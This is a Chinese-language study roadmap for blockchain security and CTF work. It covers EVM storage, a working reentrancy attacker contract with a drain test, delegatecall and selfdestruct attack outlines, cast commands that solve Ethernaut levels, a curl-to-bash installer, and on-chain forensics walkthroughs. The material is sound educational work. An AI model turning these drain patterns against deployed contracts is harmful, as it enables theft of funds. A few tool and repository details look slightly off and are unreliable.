# 区块链安全学习路线图

> 面向 CTF 竞赛 + 实战审计，从零基础到能独立解题的完整学习手册。
> 每个阶段都有：学习内容、实操命令、验证标准、推荐资源。
> 预计总时间：8–12 周（每天 2–3 小时）。

---

## 目录

1. [阶段一：基础概念与环境搭建（第 1–2 周）](#阶段一)
2. [阶段二：Solidity 与 EVM 深入（第 3–4 周）](#阶段二)
3. [阶段三：安全漏洞模式（第 5–7 周）](#阶段三)
4. [阶段四：CTF 实战训练（第 8–10 周）](#阶段四)
5. [阶段五：链上取证与溯源（第 11–12 周）](#阶段五)
6. [阶段六：进阶方向（第 13 周起）](#阶段六)
7. [工具速查表](#工具速查表)
8. [常见坑与经验](#常见坑与经验)

---

<a id="阶段一"></a>
## 阶段一：基础概念与环境搭建（第 1–2 周）

### 1.1 以太坊核心概念

#### 账户模型

以太坊有两种账户，理解它们的区别是一切的基础：

```
EOA（外部拥有账户）
├── 由私钥控制（私钥 → secp256k1 公钥 → keccak256 → 地址后 20 字节）
├── 可以主动发起交易
├── 没有 code 和 storage
└── 例：你的 MetaMask 钱包

合约账户（Contract Account）
├── 由部署时的创建交易生成（地址 = keccak256(rlp(sender, nonce))[12:]）
├── 不能主动发起交易，只能被调用或被其他合约调用
├── 有 code（字节码）和 storage（持久化存储）
└── 例：一个 ERC-20 代币合约
```

**验证标准**：能说清为什么 EOA 可以发交易而合约不能；能解释合约地址为什么可以在部署前预测（`CREATE` 用 sender+nonce，`CREATE2` 用 keccak256(0xff, sender, salt, code_hash)）。

#### 交易结构

一笔以太坊交易包含以下字段（签名后构成 RLP 编码的原始数据）：

| 字段 | 类型 | 说明 | CTF 相关 |
|---|---|---|---|
| nonce | u64 | 发送者账户的交易计数，防重放 | 重放攻击 |
| to | 20 bytes | 目标地址（空 = 创建合约） | 合约部署 |
| value | u256 | 转账 ETH 数量（wei 为单位，1 ETH = 10^18 wei） | 强制转 ETH |
| data | bytes | 调用数据 / 合约字节码 | **inputdata 解码是取证核心** |
| gasLimit | u64 | 最大 gas 消耗 | gas griefing |
| maxFeePerGas | u256 | EIP-1559 最高出价 | 前置交易 |
| maxPriorityFeePerGas | u256 | 小费 | MEV |
| v, r, s | — | ECDSA 签名 | 签名重放 |

**实操**：用 `cast` 查看一笔真实交易

```bash
# 安装 Foundry（详见 1.2）
# 查看一笔 Sepolia 测试网交易
cast tx 0x<交易哈希> --rpc-url https://rpc.sepolia.org

# 解码 inputdata 的函数选择器
cast 4byte 0xa9059cbb
# → transfer(address,uint256)

# 解码完整的 calldata
cast 4byte-decode 0xa9059cbb000000000000000000000000<地址>0000...<金额>
```

#### Gas 机制

```
EIP-1559 之前：
  gasPrice = 你愿意为每单位 gas 支付的 wei 数

EIP-1559 之后：
  maxFeePerGas = baseFee + priorityFee
  baseFee = 协议自动调整（区块拥挤时升高）
  priorityFee = 小费给矿工/验证者

关键点：
  - 交易 revert 也会消耗 gas（已执行到 revert 点的 gas 全部扣除）
  - gasLimit 设太低 → 交易失败但 gas 仍然被扣
  - gasLeft() 可以在合约内读取剩余 gas
```

**CTF 相关**：有些挑战要求你用特定 gas 量完成操作（gas golfing），或者利用 gas 消耗差异做时序攻击。

#### EVM 存储布局

这是 CTF 区块链题最核心的知识点——**合约的"私有"变量在链上是公开的**。

```
存储槽分配规则：
1. 状态变量按声明顺序从 slot 0 开始
2. 每个变量占满一个完整 slot（除非可以 packing）
3. mapping 和动态数组不直接存数据，而是存 keccak256 的位置
4. struct 的成员连续排列
5. constant/immutableView 不占 storage slot

Mapping 的 slot 计算：
  对于 mapping(k => v) 声明在 slot N
  key 为 K 的值的存储位置 = keccak256(abi.encode(K, N))
  
动态数组的 slot 计算：
  对于 uint[] 声明在 slot N
  数组长度存在 slot N
  第 i 个元素的存储位置 = keccak256(N) + i

bytes/string 的 slot 计算：
  同动态数组；若数据 ≤ 31 字节则直接存在 slot N（高字节为长度*2）
```

**实操**：读"私有"变量

```bash
# 假设合约有一个 private bytes32 password 在 slot 0
cast storage <合约地址> 0 --rpc-url $RPC
# → 返回 32 字节的 hex → 就是"私有"密码

# 读 mapping 中的值（mapping 声明在 slot 1，key = 你的地址）
cast keccak $(cast abi-encode "f(address,uint256)" <你的地址> 1)
# → 得到存储槽号
cast storage <合约地址> <槽号> --rpc-url $RPC
```

#### 事件（Event / Log）

```
event Transfer(address indexed from, address indexed to, uint256 value);
                    ↑ indexed = 存在 topic 中       ↑ 非 indexed = 存在 data 中

event 存储在交易的 receipt 里，不是在 storage 里
indexed 参数最多 3 个（加上 event signature 的 topic0 共 4 个 topic）
```

**实操**：查询事件

```bash
# 查询 ERC-20 Transfer 事件
cast logs --from-block 0 --to-block latest \
    --address <代币合约地址> \
    "Transfer(address indexed from, address indexed to, uint256 value)" \
    --rpc-url $RPC
```

---

### 1.2 环境搭建

#### Foundry 安装（推荐，Rust 编写，速度最快）

```bash
# Linux / macOS
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Windows（用 WSL 或 Scoop）
# WSL:
curl -L https://foundry.paradigm.xyz | bash && foundryup

# 验证
forge --version    # Solidity 编译器 + 测试框架
cast --version     # 命令行交互工具（CTF 神器）
anvil              # 本地开发链
```

#### 创建第一个 Foundry 项目

```bash
forge init my-first-project
cd my-first-project

# 项目结构：
# ├── foundry.toml      配置文件
# ├── src/              合约源码
# │   └── Counter.sol
# ├── script/           部署脚本
# │   └── Counter.s.sol
# ├── test/             测试
# │   └── Counter.t.sol
# └── lib/              依赖（forge-std 等）

# 编译
forge build

# 运行测试
forge test -vvv      # -vvv 显示 console.log

# 本地链
anvil                # 启动，默认 http://localhost:8545
# 会输出 10 个测试账户和私钥
```

#### MetaMask 配置

```
1. 安装浏览器扩展
2. 创建钱包 → 记好助记词和私钥（CTF 用测试网私钥无所谓，但养成好习惯）
3. 添加 Sepolia 测试网：
   - Network Name: Sepolia
   - RPC URL: https://rpc.sepolia.org
   - Chain ID: 11155111
   - Currency: ETH
4. 从水龙头获取测试 ETH：
   - https://sepoliafaucet.com/
   - https://faucet.sepolia.dev/
   - https://www.alchemy.com/faucets/ethereum-sepolia
```

#### 测试网选择

| 网络 | Chain ID | 用途 | 水龙头 |
|---|---|---|---|
| Sepolia | 11155111 | 当前默认测试网 | sepoliafaucet.com |
| Holesky | 17000 | 质押测试 | holesky-faucet |
| Goerli | 5 | **已弃用**（2024 关闭） | — |
| Anvil (本地) | 31337 | Foundry 本地链 | 不需要 |

> 注意：华为杯 2024 的 SeekThroughAllNetworks 和 广为人知的秘密 用的都是
> Goerli（当时还在），现在 Goerli 已下线，需要用 Etherscan 的归档数据查看。

#### RPC 节点

```
免费公共 RPC：
  - https://rpc.sepolia.org
  - https://ethereum-sepolia-rpc.publicnode.com
  - https://rpc.ankr.com/eth_sepolia（需要 API key，更稳定）

付费（更稳定、更快）：
  - Alchemy: alchemy.com（免费额度够用）
  - Infura: infura.io（免费额度够用）
  - QuickNode: quicknode.com

设置环境变量（后面所有命令都会用到）：
  export RPC_URL="https://rpc.sepolia.org"
  export PRIVATE_KEY="0x你的私钥"
```

---

### 1.3 阶段一验证清单

```
□ forge init 创建项目并编译成功
□ anvil 启动本地链并连接 MetaMask
□ 用 cast 查询任意地址的 ETH 余额
□ 用 cast storage 读到一个合约的 slot 0
□ 能手算 mapping(key) 的存储槽号
□ 能解释 EOA 和合约账户的三个区别
□ 从水龙头获得了 Sepolia 测试 ETH
□ 能解释一笔交易的每个字段的作用
```

---

<a id="阶段二"></a>
## 阶段二：Solidity 与 EVM 深入（第 3–4 周）

### 2.1 Solidity 语言核心

#### 基础语法（30 分钟快速过一遍，边做边学）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Basics {
    // 状态变量（存储在链上，占 storage slot）
    uint256 public count;           // public 自动生成 getter
    address public owner;
    mapping(address => uint256) public balances;
    uint256[] public numbers;       // 动态数组
    string public name;

    // 修饰符
    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor() {
        owner = msg.sender;         // 部署者
    }

    // 函数可见性: public / external / internal / private
    function increment() public onlyOwner {
        count += 1;
        emit CountChanged(count);   // 触发事件
    }

    // payable = 可以接收 ETH
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // view = 只读不写; pure = 既不读也不写
    function getCount() public view returns (uint256) {
        return count;
    }

    // 事件（链上日志）
    event CountChanged(uint256 newCount);
}
```

#### 函数选择器与 ABI 编码

```
函数选择器 = keccak256("functionName(paramTypes)") 的前 4 字节
例如：transfer(address,uint256) 的选择器 = 0xa9059cbb

调用数据（calldata）格式：
  [4 字节选择器][32 字节参数1][32 字节参数2]...
  
CTF 核心：即使不知道合约源码，只要知道函数名和参数类型
  就可以构造 calldata 调用任何函数
  
cast calldata "transfer(address,uint256)" 0x... 1000
# → 输出完整的 calldata hex
```

#### 三种调用方式

```
call:     普通调用，切换到目标合约的存储上下文
delegatecall: 在调用者的存储上下文中执行目标合约的代码 ← 安全核心
staticcall:   同 call 但禁止状态修改

delegatecall 的含义：
  - 合约 A delegatecall 合约 B 的函数 f
  - f 中的 this = A 的地址
  - f 读写的是 A 的 storage
  - msg.sender = 调用 A 的原始调用者
  - 如果 B 的代码知道 A 的存储布局 → 可以修改 A 的任何变量
  - 这就是代理合约(Proxy)的工作原理，也是攻击面
```

### 2.2 EVM 汇编入门（不要求精通，能看懂即可）

```bash
# 用 forge 查看 Solidity 编译后的 EVM 字节码
forge inspect src/Counter.sol:Counter asm

# 常见操作码（CTF 逆向需要认识的）：
# SLOAD (0x54)      读存储
# SSTORE (0x55)     写存储
# CALL (0xF1)       外部调用
# DELEGATECALL (0xF4) 代理调用
# CALLER (0x33)     msg.sender
# CALLVALUE (0x34)  msg.value
# SELFDESTRUCT (0xFF) 自毁
# KECCAK256 (0x20)  哈希
```

### 2.3 用 Python (web3.py) 与链交互

```python
from web3 import Web3

# 连接
w3 = Web3(Web3.HTTPProvider("https://rpc.sepolia.org"))
print(w3.is_connected())  # True

# 查余额
balance = w3.eth.get_balance("0x...")
print(Web3.from_wei(balance, "ether"))

# 读合约
abi = [{"inputs": [], "name": "count", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"}]
contract = w3.eth.contract(address="0x...", abi=abi)
print(contract.functions.count().call())

# 读存储（绕过 ABI 直接读 slot）
slot0 = w3.eth.get_storage_at("0x...", 0)
print(slot0.hex())

# 构造交易
tx = {
    "to": "0x...",
    "value": Web3.to_wei(0.001, "ether"),
    "gas": 21000,
    "gasPrice": w3.eth.gas_price,
    "nonce": w3.eth.get_transaction_count("0x你的地址"),
    "chainId": 11155111,
}
signed = w3.eth.account.sign_transaction(tx, private_key)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
```

### 2.4 阶段二验证清单

```
□ 能手写一个完整的 ERC-20 合约（不用 OpenZeppelin 导入）
□ 能用 cast calldata 构造任意函数调用
□ 能解释 call / delegatecall / staticcall 的区别和各自的存储上下文
□ 能用 web3.py 部署合约并调用函数
□ 能读懂 forge inspect 输出的 EVM 汇编（至少认识 SLOAD/SSTORE/CALL）
□ 能解释 keccak256(abi.encode(key, slot)) 的 mapping 存储计算
□ 理解 constructor / receive / fallback 三个特殊函数的触发时机
```

---

<a id="阶段三"></a>
## 阶段三：安全漏洞模式（第 5–7 周）

> 每个漏洞类型按四步学习：①理解原理 → ②写漏洞合约 → ③写攻击合约 → ④在 anvil 上复现

### 3.1 重入攻击（Reentrancy）——最经典的以太坊漏洞

#### 原理

```
合约 A 调用合约 B 的函数（如 B 的 receive 或 fallback）
→ B 在回调中再次调用 A 的函数
→ A 的状态还没有更新（如余额未清零）
→ B 可以多次提取资金

关键条件：
1. A 使用 call{value: ...} 转账（而不是 transfer/send）
2. A 在转账之后才更新状态（checks-effects-interactions 顺序错误）
3. B 有 receive() 或 fallback() 可接收 ETH 并执行逻辑
```

#### 完整攻击复现

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ===== 漏洞合约（模拟一个简单的银行） =====
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        // ⚠️ 漏洞：先转账，后清零
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");
        balances[msg.sender] = 0;  // 这行永远执行不到（因为重入时已经提完了）
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// ===== 攻击合约 =====
contract ReentrancyAttacker {
    VulnerableBank public target;
    uint256 public attackCount;
    
    constructor(address _target) {
        target = VulnerableBank(_target);
    }
    
    function attack() public payable {
        require(msg.value >= 1 ether, "need 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();  // 首次提取，触发回调
    }
    
    // 目标合约转账时会调用这个函数（因为我们是合约）
    receive() external payable {
        if (address(target).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            target.withdraw();  // 递归重入！
        }
    }
}
```

#### 在 Foundry 中测试

```solidity
// test/Reentrancy.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract ReentrancyTest is Test {
    VulnerableBank bank;
    ReentrancyAttacker attacker;
    
    function setUp() public {
        bank = new VulnerableBank();
        // 给银行注入 10 ETH
        (bool ok,) = address(bank).call{value: 10 ether}("");
        require(ok);
        attacker = new ReentrancyAttacker(address(bank));
    }
    
    function testReentrancy() public {
        attacker.attack{value: 1 ether}();
        // 攻击者的余额 = 1(存入) + 10(银行的全部) = 11 ETH
        assertEq(address(attacker).balance, 11 ether);
        // 银行被掏空
        assertEq(address(bank).balance, 0);
    }
}
```

```bash
forge test --match-test testReentrancy -vvv
```

#### 防御方案

```solidity
// 方案 1: Checks-Effects-Interactions（先检查，再更新状态，最后交互）
function withdrawSecure() public {
    uint256 amount = balances[msg.sender];
    balances[msg.sender] = 0;              // 先更新状态
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
}

// 方案 2: 重入锁（ReentrancyGuard）
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
contract SecureBank is ReentrancyGuard {
    function withdraw() public nonReentrant {
        // ...
    }
}
```

---

### 3.2 整数溢出（Integer Overflow / Underflow）

```
Solidity ≥ 0.8.0 内置了溢出检查（自动 revert）
Solidity < 0.8.0 需要手动检查或使用 SafeMath

CTF 中遇到 0.8 以下的合约 → 直接找溢出漏洞

典型场景：
- balance -= amount 当 amount > balance → 下溢为巨大数
- a * b / c 当中间值溢出
- uint8 循环计数器 255 + 1 = 0
```

```bash
# 用 forge 检测（配合 slither 静态分析）
pip install slither-analyzer
slither src/Vulnerable.sol
```

---

### 3.3 私有变量读取——"链上无隐私"

#### 原理

```
Solidity 的 private 关键字只阻止其他合约在编译时访问
→ EVM 存储是完全公开的，任何人都可以用 eth_getStorageAt 读取

存储槽计算：
  变量声明顺序 → slot 编号
  mapping(k => v) 在 slot N → key K 的值在 slot keccak256(K . N)
  数组在 slot N → 长度在 slot N，元素在 keccak256(N) + index
```

#### 实操

```bash
# 假设 CTF 合约有 private bytes32 password 在 slot 0
cast storage $TARGET 0 --rpc-url $RPC
# → 0x<password hex>

# 如果是 mapping(address => bytes32) 在 slot 1
# 你的地址 = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
cast keccak $(cast calldata "f(address,uint256)" 0xf39F...9666 1)
# → 得到槽号
cast storage $TARGET <槽号> --rpc-url $RPC

# 如果是 string 在 slot 2
# 先检查 slot 2 是否存了短字符串（最低字节 = 长度×2）
cast storage $TARGET 2 --rpc-url $RPC
```

---

### 3.4 Delegatecall 劫持

#### 原理

```
代理模式：
  Proxy 合约（存储所有状态） delegatecall → Logic 合约（只有代码）
  → Logic 的代码在 Proxy 的存储上下文中执行

攻击条件：
  - Proxy 的逻辑地址可以被修改
  - 或者 Logic 合约有可被滥用的函数
  - 或者 Proxy 的存储槽布局与 Logic 不匹配（存储碰撞）

经典案例：The Parity Wallet Hack (2017) — 损失 $150M
```

```solidity
// ===== 代理合约 =====
contract Proxy {
    address public implementation;  // slot 0
    
    function upgrade(address _new) public {
        implementation = _new;
    }
    
    fallback() external payable {
        (bool ok,) = implementation.delegatecall(msg.data);
        require(ok);
    }
}

// ===== 攻击 =====
// 1. 调用 upgrade(攻击者地址)
// 2. 攻击者合约有同名的函数 → 在 Proxy 的上下文中执行
// 3. 修改 Proxy 的 owner 为攻击者 → 接管合约
```

---

### 3.5 自毁强转 ETH（Selfdestruct）

```
selfdestruct(地址) 可以强制给任意地址发送 ETH
→ 即使目标合约没有 receive/fallback，ETH 也会被强塞进去
→ 破坏 "address(this).balance == X" 的不变量检查
→ Solidity 0.8.x 中 selfdestruct 仍然可以强制发 ETH（EIP-6780 部分改变了行为）

CTF 场景：合约检查 address(this).balance == 初始值
  → 攻击者 selfdestruct 强转 1 wei
  → 不变量被破坏 → 通过检查
```

---

### 3.6 其他漏洞速查表

| 漏洞 | 原理 | 检测方法 | CTF 频率 |
|---|---|---|---|
| tx.origin 认证 | 用 tx.origin 做权限检查 → 钓鱼攻击 | 代码审计 | ★★★★ |
| 无权限校验 | 关键函数没有 onlyOwner | 代码审计 | ★★★★★ |
| 随机数可预测 | block.timestamp / blockhash 做随机源 | 代码审计 | ★★★★ |
| 竞态条件 | approve + transferFrom 的竞态 | 事件分析 | ★★ |
| 签名重放 | 同一签名多链/多合约使用 | 代码审计 | ★★★ |
| gas griefing | 故意消耗 gas 使对方交易失败 | 场景分析 | ★★ |
| 逻辑分歧 | view 函数与实际状态不一致 | fork 测试 | ★★★ |

---

### 3.7 阶段三验证清单

```
□ 能在 anvil 上完整复现重入攻击（写漏洞合约+攻击合约+测试）
□ 能用 cast storage 读取 private mapping 中的值
□ 能解释 delegatecall 的存储上下文继承原理
□ 能构造 selfdestruct 强制转 ETH 的攻击
□ 能识别 tx.origin vs msg.sender 的安全区别
□ 了解 Solidity 0.8.x 的内置溢出保护
□ 能用 slither 对合约做静态分析
```

---

<a id="阶段四"></a>
## 阶段四：CTF 实战训练（第 8–10 周）

### 4.1 Ethernaut —— 入门必做（30+ 关）

```
网址: https://ethernaut.openzeppelin.com/
玩法: 每关一个合约实例，找到漏洞并利用，满足通关条件

环境搭建:
  1. 安装 MetaMask → 连接 Sepolia
  2. 获取测试 ETH
  3. 浏览器打开 ethernaut.openzeppelin.com → Create Instance

每关通用流程:
  1. 阅读关卡合约源码
  2. 找到漏洞
  3. 编写攻击合约或用 cast 构造交易
  4. 部署攻击合约并执行
  5. 提交实例地址通关
```

#### 关卡攻略提示（不是答案，是思考方向）

| 关 | 名称 | 核心考点 | 思考方向 |
|---|---|---|---|
| 1 | Hello Ethernaut | 平台交互 | 打开控制台，照着 ABI 操作 |
| 2 | Fallback | receive + ownership | 怎么成为 owner 并提空合约？ |
| 3 | Fallout | constructor 拼写 | 旧版 Solidity 的 constructor 就是普通函数 |
| 4 | Coin Flip | 随机数预测 | block.number 可以在同一个 tx 中预知 |
| 5 | Telephone | tx.origin | tx.origin ≠ msg.sender |
| 6 | Token | 整数下溢 | transfers[msg.sender] -= value 如果 value > balance |
| 7 | Delegation | delegatecall | 函数选择器碰撞：怎么让 fallback 路由到目标函数 |
| 8 | Force | selfdestruct | 没有 receive 的合约也能收到 ETH |
| 9 | Vault | private 存储 | cast storage 读 slot 1 |
| 10 | King | DOS 攻击 | 怎么让合约永远无法收回王位 |

#### 用 cast 直接通关（不需要写合约）

```bash
# 设置环境变量
export TARGET="<关卡实例地址>"
export PK="0x你的私钥"
export RPC="https://rpc.sepolia.org"

# 例：Fallback 关卡
# 1. contribute 1 wei
cast send $TARGET "contribute()" --value 1000000000000000000 --private-key $PK --rpc-url $RPC
# 等等，contribute 不接收 ETH... 用下面的方式
cast send $TARGET "contribute()" --private-key $PK --rpc-url $RPC

# 2. 直接发 ETH 触发 receive → 成为 owner
cast send $TARGET --value 1 --private-key $PK --rpc-url $RPC

# 3. withdraw
cast send $TARGET "withdraw()" --private-key $PK --rpc-url $RPC

# 4. 验证 owner
cast call $TARGET "owner()" --rpc-url $RPC
```

#### 用 Foundry 脚本通关（更正式）

```solidity
// script/Solve.s.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";

contract Solve is Script {
    function run() external {
        uint256 pk = vm.envUint("PK");
        vm.startBroadcast(pk);
        
        Target target = Target(vm.envAddress("TARGET"));
        // 你的攻击逻辑
        
        vm.stopBroadcast();
    }
}
```

---

### 4.2 Damn Vulnerable DeFi —— DeFi 安全进阶

```
网址: https://www.damnvulnerabledefi.xyz/
难度: 中到高
前置: Ethernaut 至少完成前 10 关 + 理解 DeFi 基本概念

安装:
git clone https://github.com/WindowsOverflow/damn-vulnerable-defi.git
cd damn-vulnerable-defi
yarn install
forge test  # 全部测试应该 FAIL（因为你要写攻击）

每个挑战:
  - 有一个初始状态设置（多合约交互）
  - 目标：让某个不变量被破坏
  - 通常需要 flash loan
```

---

### 4.3 CTF2 平台 BLOCKCHAIN 挑战

```
CTF2 平台的 BLOCKCHAIN 类题目通常分两类：

1. 智能合约攻防（需要启动环境）
   - 平台给你一个 RPC 端点和合约地址
   - 你需要找到漏洞并利用
   - 提交 flag（通常在合约的某个变量中）

2. 链上取证（给交易哈希，离线分析）
   - 给一个交易哈希或地址
   - 用 Etherscan/cast 分析交易
   - 解码 inputdata / event / IPFS 链接
   - 华为杯 2024 的两道区块链题都是这种类型
```

---

<a id="阶段五"></a>
## 阶段五：链上取证与溯源（第 11–12 周）

> 这是华为杯比赛的特色方向，与 DeFi 攻防是两个不同的技能树。

### 5.1 核心技能链

```
题目给出：交易哈希 / 地址 / 合约地址
    ↓
第一步：查交易详情
    工具：Etherscan / ethplorer / Blockscout / cast
    看什么：from, to, value, inputdata, logs
    ↓
第二步：解码 inputdata
    工具：cast 4byte-decode / 4byte.directory
    看什么：函数选择器 → 参数解码 → 可能包含 IPFS CID / URL
    ↓
第三步：查 Event Logs
    工具：cast receipt <tx_hash>
    看什么：Transfer 事件、自定义事件
    ↓
第四步：提取外部资源
    IPFS CID → ipfs.io/ipfs/<CID> 或 cloudflare-ipfs.com
    URL → 直接下载
    ↓
第五步：继续解码
    下载的文件可能是：图片（LSB隐写/宽高修改）、PSD（图层二维码）、
    文档（Word 隐写）、加密压缩包
    ↓
flag
```

### 5.2 实操工具链

```bash
# 命令行查链上数据
cast receipt 0x<交易哈希> --rpc-url $RPC
cast tx 0x<交易哈希> --rpc-url $RPC
cast storage <合约地址> <slot> --rpc-url $RPC

# Etherscan API（需要免费 API key）
curl "https://api.etherscan.io/api?module=proxy&action=eth_getTransactionByHash&txhash=0x...&apikey=<key>"

# Python web3.py
from web3 import Web3
w3 = Web3(Web3.HTTPProvider($RPC))
tx = w3.eth.get_transaction("0x...")
print("inputdata:", tx.input.hex())
print("to:", tx.to)
receipt = w3.eth.get_transaction_receipt("0x...")
for log in receipt.logs:
    print("event topic:", log.topics[0].hex())
    print("event data:", log.data.hex())
```

### 5.3 华为杯真题实操（2024）

#### SeekThroughAllNetworks

```
步骤 1: 题目给出交易哈希（Goerli 测试网）
步骤 2: 在 Etherscan Goerli（或归档数据）查看交易
步骤 3: inputdata 中提取 IPFS CID
        → inputdata 的 hex 解码后包含 "ipfs://<CID>"
步骤 4: 通过 IPFS gateway 下载文件
        → https://ipfs.io/ipfs/<CID>
        → https://cloudflare-ipfs.com/ipfs/<CID>
步骤 5: 下载得到 .psd 文件（Photoshop 文档）
步骤 6: 用 GIMP/Photopea 打开 → 两个图层各有一张二维码
步骤 7: 扫码 → 前半段 base64 + 后半段明文 → 拼接 → flag
```

#### 广为人知的秘密

```
步骤 1: 题面 base64 解码 → "str->hex->account->nonce1"
步骤 2: 把秘密字符串 "秘密吗?藏在Goerli网络里." 的 UTF-8 字节转 hex
        → e79...8c2e（32 字节 = 64 个 hex 字符 = 私钥）
步骤 3: 用这个 hex 作为私钥导入 MetaMask
        → 或用 cast 计算地址：
        cast wallet address --private-key 0x<hex>
        → 0x34c5a8Cbe765454A43f515cFe94928d26c2fE186
步骤 4: 在 goerli.etherscan.io 查该地址的交易
步骤 5: 查看 call/inputdata → flag 藏在交易的 input data 中
```

#### 你的 Rust 工具已支持的部分

```bash
# keccak256 + secp256k1 + 地址推导（已实现！）
# ctf-crypto::ecc 模块的测试用例就是华为杯真题
cargo test -p ctf-crypto --lib eth_address
# → 0x34c5a8cbe765454a43f515cfe94928d26c2fe186 ✓
```

### 5.4 常见链上取证技巧

| 技巧 | 说明 | 工具 |
|---|---|---|
| 读 private 变量 | eth_getStorageAt 按 slot 读 | cast storage |
| 解码 inputdata | 4byte directory 查选择器 | cast 4byte-decode |
| 追踪内部调用 | Etherscan 的 transaction trace | Tenderly.co |
| 查 event logs | receipt 的 logs 数组 | cast receipt |
| 找 token transfer | ERC-20 Transfer 事件过滤 | Etherscan token tab |
| IPFS 下载 | 多个 gateway 尝试 | ipfs.io / dweb.link |
| NFT metadata | tokenURI → base64 JSON → image URL | cast call tokenURI |

---

<a id="阶段六"></a>
## 阶段六：进阶方向（第 13 周起）

### 方向 A：DeFi 安全审计

| 主题 | 核心内容 | 学习资源 |
|---|---|---|
| AMM 原理 | Uniswap V2/V3 的恒定乘积公式、LP token | Uniswap V2 whitepaper |
| 闪电贷 | 无抵押借贷 → 原子性利用 | Aave flash loan 文档 |
| 预言机操纵 | TWAP vs 现货价格、闪电贷操纵价格 | Chainlink 文档 |
| 治理攻击 | 投票权集中、proposal 恶意执行 | Compound governance |
| 再平衡攻击 | Vault share price 操纵 | Euler Finance 事件 |

### 方向 B：MEV（最大可提取价值）

| 主题 | 核心内容 |
|---|---|
| 三明治攻击 | 在目标交易前后各插入一笔交易获利 |
| 套利 | 不同 DEX 之间的价格差异 |
| 清算 | 借贷协议的清算机器人 |
| Flashbots | MEV 拍卖、私密交易池 |

### 方向 C：跨链桥安全

| 主题 | 核心内容 |
|---|---|
| 消息验证 | 轻客户端 vs 多签 vs 乐观验证 |
| 锁定-铸造 | 原链锁定 → 目标链铸造 |
| 流动性池 | 原链销毁 → 目标链释放 |
| 历史 events | Ronin ($624M)、Wormhole ($325M)、Nomad ($190M) |

---

<a id="工具速查表"></a>
## 工具速查表

### 命令行工具

```bash
# Foundry 套件
cast <call|send|storage|balance|block|tx|receipt|4byte|keccak|abi-encode|calldata|wallet>
forge <build|test|create|init|inspect>
anvil                     # 本地链

# 常用 cast 命令
cast balance <addr> --rpc-url $RPC
cast storage <addr> <slot> --rpc-url $RPC
cast call <addr> "func()" --rpc-url $RPC
cast send <addr> "func(params)" <args> --private-key $PK --rpc-url $RPC
cast 4byte <selector>                       # 查 4byte.directory
cast 4byte-decode <calldata>                # 解码 calldata
cast keccak "string"                        # keccak256 哈希
cast wallet address --private-key 0x<hex>   # 私钥 → 地址
cast abi-encode "f(uint256)" 42             # ABI 编码
cast sig "transfer(address,uint256)"        # 函数选择器
cast format-bytes32-string "text"           # bytes32 编码字符串
```

### Python 库

```bash
pip install web3 py-solc-x eth-account
```

```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider("https://rpc.sepolia.org"))

# 合约交互
contract = w3.eth.contract(address, abi=abi)
result = contract.functions.method(args).call()
tx = contract.functions.method(args).build_transaction({...})

# 存储读取
slot_data = w3.eth.get_storage_at(address, slot_number)

# 事件过滤
event_filter = contract.events.Transfer.create_filter(from_block=0)
for event in event_filter.get_all_entries():
    print(event.args)

# 签名验证
from eth_account.messages import encode_defunct
message = encode_defunct(text="Hello")
signed = w3.eth.account.sign_message(message, private_key)
recovered = w3.eth.account.recover_message(signed)
```

### 审计工具

```bash
# Slither（静态分析）
pip install slither-analyzer
slither src/Contract.sol

# Mythril（符号执行）
pip install mythril
myth analyze src/Contract.sol

# Echidna（模糊测试）
pip install echidna
echidna-test src/Contract.sol
```

### 在线工具

| 工具 | 用途 | 网址 |
|---|---|---|
| Etherscan | 交易/合约/代币查看 | etherscan.io |
| Tenderly | 交易模拟和调试 | tenderly.co |
| 4byte.directory | 函数选择器查询 | 4byte.directory |
| Remix IDE | 在线 Solidity IDE | remix.ethereum.org |
| Dune Analytics | 链上数据分析 | dune.com |
| OpenChain | 链上数据查看 | openchain.xyz |

---

<a id="常见坑与经验"></a>
## 常见坑与经验

### 新手常犯的错误

| 坑 | 说明 |
|---|---|
| 主网私钥泄漏 | CTF 的私钥不要和有真钱的私钥混用 |
| Goerli 已关闭 | 2024 年关闭了，用 Sepolia；旧题目需要 Etherscan 归档 |
| gasLimit 太低 | 交易 revert 但 gas 全扣 → 多给一点 gasLimit |
| RPC 限速 | 公共 RPC 有请求限制，用 Alchemy/Infura 免费计划 |
| 忘记 unlock 账户 | cast send 需要 --unlock 或 --private-key |
| Solidity 版本 | CTF 合约可能是 0.6/0.7/0.8，注意编译器版本 |
| network mismatch | 确认 MetaMask 和 cast 用的链一致 |

### CTF 解题思路模板

```
1. 读合约源码 → 找到 flag 存在哪里
2. 确定利用条件 → 需要什么状态/权限/资金
3. 找到漏洞 → 什么机制可以被利用
4. 写攻击合约或构造 calldata
5. 在本地 anvil 上测试（如果可以 fork）
6. 在目标链上执行
7. 检查 flag / 完成条件

提示：
- 如果合约有 private 变量 → 先用 cast storage 读
- 如果合约有 payable fallback → 可能需要强转 ETH
- 如果合约用 delegatecall → 检查存储布局
- 如果合约有 selfdestruct → 检查不变量
- 如果题目提到 flash loan → 考虑闪电贷攻击
```

### 华为杯 vs 传统 CTF 的区别

| 维度 | 传统 CTF (Ethernaut) | 华为杯区块链题 |
|---|---|---|
| 题型 | 合约攻防 | 链上取证/溯源 |
| 工具 | Foundry + Remix | Etherscan + Python |
